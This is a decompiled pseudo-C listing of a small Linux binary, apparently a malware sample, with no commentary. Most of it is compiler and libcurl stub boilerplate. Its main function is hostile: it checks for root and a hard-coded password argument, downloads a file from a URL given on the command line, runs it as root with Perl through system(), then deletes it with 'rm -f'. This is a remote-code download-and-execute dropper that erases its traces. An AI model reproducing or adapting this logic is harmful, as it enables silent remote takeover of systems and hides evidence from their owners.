void _init()
{
    if (__gmon_start__ != 0)
    {
        __gmon_start__();
    }
}

int64_t sub_1020()
{
    int64_t var_8 = 0;
    /* jump -> nullptr */
}

int64_t sub_1030()
{
    int64_t var_8 = 0;
    /* tailcall */
    return sub_1020();
}

int64_t sub_1040()
{
    int64_t var_8 = 1;
    /* tailcall */
    return sub_1020();
}

int64_t sub_1050()
{
    int64_t var_8 = 2;
    /* tailcall */
    return sub_1020();
}

int64_t sub_1060()
{
    int64_t var_8 = 3;
    /* tailcall */
    return sub_1020();
}

int64_t sub_1070()
{
    int64_t var_8 = 4;
    /* tailcall */
    return sub_1020();
}

int64_t sub_1080()
{
    int64_t var_8 = 5;
    /* tailcall */
    return sub_1020();
}

int64_t sub_1090()
{
    int64_t var_8 = 6;
    /* tailcall */
    return sub_1020();
}

int64_t sub_10a0()
{
    int64_t var_8 = 7;
    /* tailcall */
    return sub_1020();
}

int64_t sub_10b0()
{
    int64_t var_8 = 8;
    /* tailcall */
    return sub_1020();
}

int64_t sub_10c0()
{
    int64_t var_8 = 9;
    /* tailcall */
    return sub_1020();
}

int64_t sub_10d0()
{
    int64_t var_8 = 0xa;
    /* tailcall */
    return sub_1020();
}

int64_t sub_10e0()
{
    int64_t var_8 = 0xb;
    /* tailcall */
    return sub_1020();
}

int64_t sub_10f0()
{
    int64_t var_8 = 0xc;
    /* tailcall */
    return sub_1020();
}

int64_t sub_1100()
{
    int64_t var_8 = 0xd;
    /* tailcall */
    return sub_1020();
}

void __cxa_finalize(void* d)
{
    /* tailcall */
    return __cxa_finalize(d);
}

int64_t curl_easy_cleanup()
{
    /* tailcall */
    return curl_easy_cleanup();
}

int64_t curl_easy_setopt()
{
    /* tailcall */
    return curl_easy_setopt();
}

int64_t getuid()
{
    /* tailcall */
    return getuid();
}

int32_t fclose(FILE* fp)
{
    /* tailcall */
    return fclose(fp);
}

int32_t snprintf(char* s, uint64_t maxlen, char const* format, ...)
{
    /* tailcall */
    return snprintf();
}

int64_t curl_easy_perform()
{
    /* tailcall */
    return curl_easy_perform();
}

void exit(int32_t status) __noreturn
{
    /* tailcall */
    return exit(status);
}

int32_t strcmp(char const* arg1, char const* arg2)
{
    /* tailcall */
    return strcmp(arg1, arg2);
}

int64_t malloc(uint64_t bytes)
{
    /* tailcall */
    return malloc(bytes);
}

int32_t puts(char const* str)
{
    /* tailcall */
    return puts(str);
}

int64_t curl_easy_init()
{
    /* tailcall */
    return curl_easy_init();
}

int32_t setuid(uid_t uid)
{
    /* tailcall */
    return setuid(uid);
}

FILE* fopen(char const* filename, char const* mode)
{
    /* tailcall */
    return fopen(filename, mode);
}

int32_t system(char const* line)
{
    /* tailcall */
    return system(line);
}

int64_t _start(int64_t arg1, int64_t arg2, void (* arg3)()) __noreturn
{
    int64_t rax;
    int64_t var_8 = rax;
    __libc_start_main(main, __return_addr, &arg_8, __libc_csu_init, __libc_csu_fini, arg3, &var_8);
    /* no return */
}

void deregister_tm_clones()
{
    return;
}

void register_tm_clones()
{
    return;
}

void __do_global_dtors_aux()
{
    if (_edata != 0)
    {
        return;
    }
    if (__cxa_finalize != 0)
    {
        __cxa_finalize(__dso_handle);
    }
    deregister_tm_clones();
    _edata = 1;
}

int64_t frame_dummy()
{
    /* tailcall */
    return register_tm_clones();
}

int64_t _curl_easy_setopt_err_long()
{
    return;
}

int64_t _curl_easy_setopt_err_curl_off_t()
{
    return;
}

int64_t _curl_easy_setopt_err_string()
{
    return;
}

int64_t _curl_easy_setopt_err_write_callback()
{
    return;
}

int64_t _curl_easy_setopt_err_resolver_start_callback()
{
    return;
}

int64_t _curl_easy_setopt_err_read_cb()
{
    return;
}

int64_t _curl_easy_setopt_err_ioctl_cb()
{
    return;
}

int64_t _curl_easy_setopt_err_sockopt_cb()
{
    return;
}

int64_t _curl_easy_setopt_err_opensocket_cb()
{
    return;
}

int64_t _curl_easy_setopt_err_progress_cb()
{
    return;
}

int64_t _curl_easy_setopt_err_debug_cb()
{
    return;
}

int64_t _curl_easy_setopt_err_ssl_ctx_cb()
{
    return;
}

int64_t _curl_easy_setopt_err_conv_cb()
{
    return;
}

int64_t _curl_easy_setopt_err_seek_cb()
{
    return;
}

int64_t _curl_easy_setopt_err_cb_data()
{
    return;
}

int64_t _curl_easy_setopt_err_error_buffer()
{
    return;
}

int64_t _curl_easy_setopt_err_FILE()
{
    return;
}

int64_t _curl_easy_setopt_err_postfields()
{
    return;
}

int64_t _curl_easy_setopt_err_curl_httpost()
{
    return;
}

int64_t _curl_easy_setopt_err_curl_mimepost()
{
    return;
}

int64_t _curl_easy_setopt_err_curl_slist()
{
    return;
}

int64_t _curl_easy_setopt_err_CURLSH()
{
    return;
}

int64_t _curl_easy_getinfo_err_string()
{
    return;
}

int64_t _curl_easy_getinfo_err_long()
{
    return;
}

int64_t _curl_easy_getinfo_err_double()
{
    return;
}

int64_t _curl_easy_getinfo_err_curl_slist()
{
    return;
}

int64_t _curl_easy_getinfo_err_curl_tlssesssioninfo()
{
    return;
}

int64_t _curl_easy_getinfo_err_curl_certinfo()
{
    return;
}

int64_t _curl_easy_getinfo_err_curl_socket()
{
    return;
}

int64_t _curl_easy_getinfo_err_curl_off_t()
{
    return;
}

int32_t main(int32_t argc, char** argv, char** envp)
{
    if (argc != 3)
    {
        puts("Exiting... ");
        exit(0);
        /* no return */
    }
    if (getuid() != 0)
    {
        puts("Exiting... ");
        exit(0);
        /* no return */
    }
    if (strcmp(argv[2], "lDnxUysaQn") != 0)
    {
        puts("Exiting... ");
        exit(0);
        /* no return */
    }
    puts("Running... ");
    FILE* rax_8 = fopen(argv[2], &data_2027);
    int64_t rax_9 = curl_easy_init();
    int32_t var_40 = 0x2712;
    curl_easy_setopt(rax_9, 0x2712, argv[1], 0x2712);
    int32_t var_3c = 0x2711;
    curl_easy_setopt(rax_9, 0x2711, rax_8, 0x2711);
    int32_t var_38 = 0x2d;
    curl_easy_setopt(rax_9, 0x2d, 1, 0x2d);
    if (curl_easy_perform(rax_9) != 0)
    {
        puts("Exiting... ");
        exit(0);
        /* no return */
    }
    int64_t rax_25 = snprintf(nullptr, 0, &data_202a, argv[2]);
    char* rax_28 = malloc((rax_25 + 1));
    snprintf(rax_28, (rax_25 + 1), &data_202a, argv[2]);
    int64_t rax_37 = snprintf(nullptr, 0, "perl ./%s", rax_28);
    char* rax_40 = malloc((rax_37 + 1));
    snprintf(rax_40, (rax_37 + 1), "perl ./%s", rax_28);
    fclose(rax_8);
    curl_easy_cleanup(rax_9);
    setuid(0);
    system(rax_40);
    system("rm -f ./lDnxUysaQn");
    return 0;
}

void __libc_csu_init()
{
    _init();
    int64_t rbx_1 = 0;
    do
    {
        int64_t rdx;
        int64_t rsi;
        int32_t rdi;
        &__init_array_start[rbx_1](rdi, rsi, rdx);
        rbx_1 = (rbx_1 + 1);
    } while (1 != rbx_1);
}

void __libc_csu_fini()
{
    return;
}

int64_t _fini()
{
    return;
}

